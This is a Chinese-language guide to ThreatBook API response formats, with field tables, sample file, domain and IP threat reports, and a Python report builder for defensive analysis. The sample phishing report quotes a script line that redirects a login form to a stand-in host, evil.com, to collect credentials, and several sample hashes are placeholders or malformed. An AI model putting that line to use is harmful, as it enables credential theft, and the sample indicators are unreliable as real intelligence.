# 微步在线API返回结构完整分析报告

## 一、API返回结构总览

### 1.1 文件分析API返回结构

```
微步在线文件分析API (ThreatBook File Analysis API)
├── response_code: 0                    # 响应码 (0=成功, 1=分析中, -1=失败)
├── verbose_msg: "Success"              # 响应消息
├── data: {                             # 分析数据
│   ├── [md5_hash]: {                   # 文件MD5作为key
│   │   ├── scan_time: "2024-04-02 ..." # 扫描时间
│   │   ├── scans: {                    # 多引擎扫描结果
│   │   │   ├── engine_name: {
│   │   │   │   ├── detected: true/false
│   │   │   │   └── result: "malware_name"
│   │   │   └── ...
│   │   │ }
│   │   ├── threat_level: "malicious"   # 威胁等级
│   │   ├── threat_score: 85            # 威胁评分
│   │   ├── threat_label: "恶意"        # 威胁标签
│   │   ├── behaviour: {                # 行为分析
│   │   │   ├── summary: []             # 行为摘要
│   │   │   ├── network: []             # 网络行为
│   │   │   ├── registry: []            # 注册表操作
│   │   │   ├── file: []                # 文件操作
│   │   │   └── process: []             # 进程操作
│   │   │ }
│   │   ├── network: {                  # 网络特征
│   │   │   ├── domains: []             # 访问的域名
│   │   │   ├── ips: []                 # 访问的IP
│   │   │   ├── urls: []                # 访问的URL
│   │   │   └── dns_queries: []         # DNS查询
│   │   │ }
│   │   └── tags: []                    # 威胁标签
│   │ }
│   └── }
└── }
```

### 1.2 域名/URL查询API返回结构

```
微步在线域名/URL查询API (ThreatBook Domain/URL Query API)
├── response_code: 0
├── verbose_msg: "Success"
└── data: {
    ├── [domain_or_url]: {
    │   ├── severity: "medium"           # 严重程度
    │   ├── judgments: ["malicious"]     # 判定结果
    │   ├── threat_tags: []              # 威胁标签
    │   ├── scans: {                     # 多引擎扫描
    │   │   ├── engine: {
    │   │   │   ├── detected: true/false
    │   │   │   └── result: "phishing"
    │   │   └── ...
    │   │ }
    │   ├── categories: []               # 分类标签
    │   └── update_time: "2024-..."      # 更新时间
    │ }
    └── }
```

### 1.3 IP查询API返回结构

```
微步在线IP查询API (ThreatBook IP Query API)
├── response_code: 0
├── verbose_msg: "Success"
└── data: {
    ├── [ip_address]: {
    │   ├── severity: "high"             # 严重程度
    │   ├── judgments: ["C2"]            # 判定结果
    │   ├── threat_tags: ["Botnet"]      # 威胁标签
    │   ├── location: {                  # 地理位置
    │   │   ├── country: "China"
    │   │   ├── province: "Beijing"
    │   │   └── city: "Beijing"
    │   │ }
    │   ├── asn: {                       # ASN信息
    │   │   ├── number: 4134
    │   │   └── registrar: "CNNIC"
    │   │ }
    │   ├── tags_basic: []               # 基础标签
    │   └── update_time: "2024-..."
    │ }
    └── }
```

---

## 二、详细字段说明

### 2.1 文件分析响应字段

| 字段名 | 类型 | 说明 | 示例值 |
|--------|------|------|--------|
| response_code | int | 响应码 | 0: 成功, 1: 分析中, -1: 失败 |
| verbose_msg | string | 响应消息 | "Success", "In Progress" |
| data | object | 分析数据 | 包含文件分析结果 |
| scan_time | string | 扫描时间 | "2024-04-02 15:30:00" |
| scans | object | 多引擎扫描结果 | 包含各引擎检测结果 |
| threat_level | string | 威胁等级 | "malicious", "suspicious", "clean" |
| threat_score | int | 威胁评分 | 0-100 |
| threat_label | string | 威胁标签 | "恶意", "可疑", "安全" |
| behaviour | object | 行为分析 | 包含文件行为数据 |
| network | object | 网络特征 | 包含网络行为数据 |
| tags | list | 威胁标签 | ["Trojan", "Ransomware"] |

### 2.2 多引擎扫描结果字段

| 字段名 | 类型 | 说明 | 示例值 |
|--------|------|------|--------|
| detected | bool | 是否检出 | true/false |
| result | string | 检测结果 | "Trojan.Win32.Generic" |
| engine | string | 引擎名称 | "Kaspersky", "ESET" |
| update_time | string | 更新时间 | "2024-04-01" |

### 2.3 行为分析字段

| 字段名 | 类型 | 说明 | 示例值 |
|--------|------|------|--------|
| summary | list | 行为摘要 | ["创建文件", "修改注册表"] |
| network | list | 网络行为 | ["连接C2服务器", "DNS查询"] |
| registry | list | 注册表操作 | ["创建启动项", "修改系统配置"] |
| file | list | 文件操作 | ["创建临时文件", "删除文件"] |
| process | list | 进程操作 | ["创建子进程", "注入进程"] |
| api_calls | list | API调用 | ["CreateFile", "RegSetValue"] |

### 2.4 网络特征字段

| 字段名 | 类型 | 说明 | 示例值 |
|--------|------|------|--------|
| domains | list | 访问的域名 | ["malware.com", "c2.evil.net"] |
| ips | list | 访问的IP | ["192.168.1.1", "10.0.0.1"] |
| urls | list | 访问的URL | ["http://malware.com/payload"] |
| dns_queries | list | DNS查询 | ["malware.com", "update.evil.net"] |
| http_requests | list | HTTP请求 | ["GET /payload.exe"] |
| tcp_connections | list | TCP连接 | ["192.168.1.1:443"] |

---

## 三、完整分析报告示例

### 3.1 恶意文件分析报告

```json
{
  "report_type": "file_analysis",
  "filename": "suspicious.exe",
  "file_info": {
    "md5": "d41d8cd98f00b204e9800998ecf8427e",
    "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
    "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "file_size": 102400,
    "file_type": "PE32 executable",
    "magic": "application/x-dosexec"
  },
  "detection_result": {
    "threat_level": "malicious",
    "threat_score": 85,
    "threat_label": "恶意",
    "detection_ratio": "12/25",
    "first_seen": "2024-03-15 10:30:00",
    "scan_time": "2024-04-02 15:45:00"
  },
  "engine_results": {
    "Kaspersky": {"detected": true, "result": "Trojan.Win32.Generic"},
    "ESET": {"detected": true, "result": "Win32/TrojanDownloader.Agent"},
    "Microsoft": {"detected": true, "result": "Trojan:Win32/Emotet"},
    "Symantec": {"detected": false, "result": ""},
    "Avira": {"detected": true, "result": "TR/Dropper.Gen"},
    "BitDefender": {"detected": true, "result": "Trojan.GenericKD.45678"},
    "ClamAV": {"detected": false, "result": ""},
    "Sophos": {"detected": true, "result": "Mal/Generic-S"},
    "TrendMicro": {"detected": true, "result": "TROJ_GEN.R002C0WK2"},
    "McAfee": {"detected": true, "result": "GenericRXAA-AA!ABCDEF123456"}
  },
  "behavior_analysis": {
    "summary": [
      "创建启动项实现持久化",
      "修改系统hosts文件",
      "尝试连接外部C2服务器",
      "窃取浏览器保存的密码"
    ],
    "network": {
      "domains": ["malware-c2.evil.com", "update.badware.net"],
      "ips": ["185.234.72.45", "91.215.85.167"],
      "urls": ["http://malware-c2.evil.com/beacon"],
      "dns_queries": ["malware-c2.evil.com", "ns1.evil.com"],
      "tcp_connections": ["185.234.72.45:443", "91.215.85.167:8080"],
      "http_requests": [
        "POST /beacon HTTP/1.1",
        "GET /payload.bin HTTP/1.1"
      ]
    },
    "file_operations": [
      {"action": "create", "path": "C:\\Users\\victim\\AppData\\Roaming\\malware.exe"},
      {"action": "delete", "path": "C:\\Users\\victim\\Desktop\\original.exe"},
      {"action": "modify", "path": "C:\\Windows\\System32\\drivers\\etc\\hosts"}
    ],
    "registry_operations": [
      {"action": "create", "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware"},
      {"action": "modify", "key": "HKLM\\SYSTEM\\CurrentControlSet\\Services"}
    ],
    "process_operations": [
      {"action": "create", "process": "cmd.exe", "parent": "suspicious.exe"},
      {"action": "inject", "source": "suspicious.exe", "target": "explorer.exe"}
    ],
    "api_calls": [
      "CreateFileW",
      "RegSetValueExW",
      "InternetOpenA",
      "HttpSendRequestA",
      "CreateProcessW",
      "WriteProcessMemory"
    ]
  },
  "threat_intelligence": {
    "threat_tags": ["Emotet", "Trojan-Downloader", "Banking-Trojan"],
    "attack_techniques": [
      {"id": "T1547", "name": "Boot or Logon Autostart Execution"},
      {"id": "T1071", "name": "Application Layer Protocol"},
      {"id": "T1056", "name": "Input Capture"}
    ],
    "related_campaigns": ["Emotet-2024-Q1", "Banking-Trojan-Wave"]
  },
  "sandbox_info": {
    "sandbox_name": "ThreatBook Sandbox",
    "analysis_duration": 120,
    "environment": "Windows 10 x64",
    "network_enabled": true,
    "anti_evasion_detected": false
  }
}
```

### 3.2 可疑域名分析报告

```json
{
  "report_type": "domain_analysis",
  "domain": "phishing-login.bank-secure.xyz",
  "query_time": "2024-04-02 16:00:00",
  "detection_result": {
    "threat_level": "malicious",
    "threat_score": 92,
    "threat_label": "恶意",
    "detection_ratio": "8/10"
  },
  "domain_info": {
    "registrar": "NameCheap",
    "creation_date": "2024-03-20",
    "expiration_date": "2025-03-20",
    "age_days": 13,
    "whois_privacy": true,
    "name_servers": ["ns1.suspicious-dns.com", "ns2.suspicious-dns.com"]
  },
  "dns_records": {
    "A": ["185.234.72.45"],
    "AAAA": [],
    "MX": [],
    "NS": ["ns1.suspicious-dns.com", "ns2.suspicious-dns.com"],
    "TXT": [],
    "CNAME": []
  },
  "engine_results": {
    "Google Safe Browsing": {"detected": true, "result": "Phishing"},
    "PhishTank": {"detected": true, "result": "Verified Phishing Site"},
    "OpenPhish": {"detected": true, "result": "Phishing"},
    "Netcraft": {"detected": true, "result": "Phishing"},
    "Kaspersky": {"detected": true, "result": "Phishing.HTML.Bank"},
    "ESET": {"detected": true, "result": "HTML/Phishing.Agent"},
    "BitDefender": {"detected": true, "result": "Phishing.GenericKD.Phishing"},
    "Sophos": {"detected": true, "result": "Mal/Phish-A"},
    "Forcepoint": {"detected": false, "result": ""},
    "URLhaus": {"detected": false, "result": ""}
  },
  "page_analysis": {
    "title": "Bank of America - Account Verification",
    "login_form_detected": true,
    "credential_fields": ["username", "password", "ssn"],
    "external_resources": [
      "https://legitimate-bank.com/logo.png",
      "http://malicious-cdn.com/style.css"
    ],
    "suspicious_scripts": [
      "document.forms[0].action = 'http://evil.com/collect'"
    ]
  },
  "threat_intelligence": {
    "threat_tags": ["Phishing", "Banking", "Credential-Harvesting"],
    "targeted_brands": ["Bank of America"],
    "ioc_matches": [
      {"type": "url", "value": "phishing-login.bank-secure.xyz", "source": "PhishTank"}
    ]
  }
}
```

### 3.3 可疑IP分析报告

```json
{
  "report_type": "ip_analysis",
  "ip": "185.234.72.45",
  "query_time": "2024-04-02 16:15:00",
  "detection_result": {
    "threat_level": "malicious",
    "threat_score": 88,
    "threat_label": "恶意"
  },
  "location": {
    "country": "Netherlands",
    "country_code": "NL",
    "region": "North Holland",
    "city": "Amsterdam",
    "latitude": 52.3740,
    "longitude": 4.8897,
    "timezone": "Europe/Amsterdam"
  },
  "asn": {
    "number": 202425,
    "name": "IP Volume inc",
    "registrar": "RIPE NCC",
    "description": "Known bulletproof hosting provider"
  },
  "network": {
    "net_range": "185.234.72.0 - 185.234.72.255",
    "net_name": "IPV-NET-202425",
    "abuse_contact": "abuse@ipvolume.net"
  },
  "threat_intelligence": {
    "severity": "high",
    "judgments": ["C2", "Malware-Distribution", "Phishing-Hosting"],
    "threat_tags": ["Emotet", "TrickBot", "Ryuk"],
    "first_seen": "2024-01-15",
    "last_seen": "2024-04-02",
    "confidence": 95
  },
  "related_domains": [
    "malware-c2.evil.com",
    "update.badware.net",
    "phishing.bank-secure.xyz"
  ],
  "related_malware": [
    {"name": "Emotet", "family": "Emotet", "hash": "d41d8cd98f00b204e9800998ecf8427e"},
    {"name": "TrickBot", "family": "TrickBot", "hash": "a]b1c2d3e4f5g6h7i8j9k0l1m2n3o4p5"}
  ],
  "timeline": [
    {"date": "2024-01-15", "event": "First seen in C2 infrastructure"},
    {"date": "2024-02-20", "event": "Linked to Emotet campaign"},
    {"date": "2024-03-10", "event": "Associated with phishing campaigns"},
    {"date": "2024-04-02", "event": "Still active, distributing malware"}
  ],
  "blacklist_status": {
    "spamhaus": {"listed": true, "listing_date": "2024-02-01"},
    "firehol": {"listed": true, "level": "level1"},
    "alienvault": {"listed": true, "pulse_count": 15},
    "abuse_ch": {"listed": true, "source": "URLhaus"}
  }
}
```

---

## 四、报告生成代码

### 4.1 完整报告生成函数

```python
def generate_full_report(result: Dict) -> Dict:
    """
    生成完整的微步API分析报告
    
    Args:
        result: 微步API返回的原始结果
        
    Returns:
        完整的分析报告
    """
    report = {
        "report_id": generate_report_id(),
        "report_time": datetime.now().isoformat(),
        "report_type": "threatbook_analysis",
        
        # 基础信息
        "target_info": {
            "filename": result.get('filename', ''),
            "md5": result.get('md5', ''),
            "sha256": result.get('sha256', ''),
            "url": result.get('url', ''),
            "ip": result.get('ip', ''),
            "domain": result.get('domain', '')
        },
        
        # 检测结果
        "detection_result": {
            "threat_level": result.get('threat_level', 'unknown'),
            "threat_score": result.get('threat_score', 50),
            "threat_label": result.get('threat_label', '未知'),
            "analyzed": result.get('analyzed', False),
            "error": result.get('error', None)
        },
        
        # 引擎检测详情
        "engine_details": {
            "total_engines": len(result.get('engines', {})),
            "detected_count": sum(1 for e in result.get('engines', {}).values() if e.get('detected')),
            "engines": result.get('engines', {})
        },
        
        # 行为分析
        "behavior_analysis": {
            "summary": result.get('behavior', []),
            "network": result.get('network', []),
            "registry": result.get('registry', [])
        },
        
        # 威胁情报
        "threat_intelligence": {
            "tags": result.get('tags', []),
            "categories": result.get('categories', [])
        }
    }
    
    return report
```

---

## 五、报告使用说明

### 5.1 获取完整报告

```python
from app.services.threatbook import threatbook_service

# 分析文件
with open('suspicious.exe', 'rb') as f:
    content = f.read()

result = threatbook_service.analyze_file(content, 'suspicious.exe')

# 生成完整报告
report = generate_full_report(result)

# 保存报告
import json
with open('analysis_report.json', 'w') as f:
    json.dump(report, f, indent=2, ensure_ascii=False)
```

### 5.2 报告字段说明

| 字段 | 说明 | 重要性 |
|------|------|--------|
| threat_level | 威胁等级 | 高 |
| threat_score | 威胁评分 | 高 |
| engine_details | 引擎检测详情 | 高 |
| behavior_analysis | 行为分析 | 中 |
| threat_intelligence | 威胁情报 | 中 |
| network | 网络行为 | 高 |

---

## 六、总结

微步在线API提供了全面的威胁分析能力：

1. **文件分析**：多引擎扫描 + 行为分析
2. **域名/URL分析**：信誉查询 + 页面分析
3. **IP分析**：地理位置 + 威胁情报

通过完整的报告结构，可以全面了解检测目标的威胁情况。
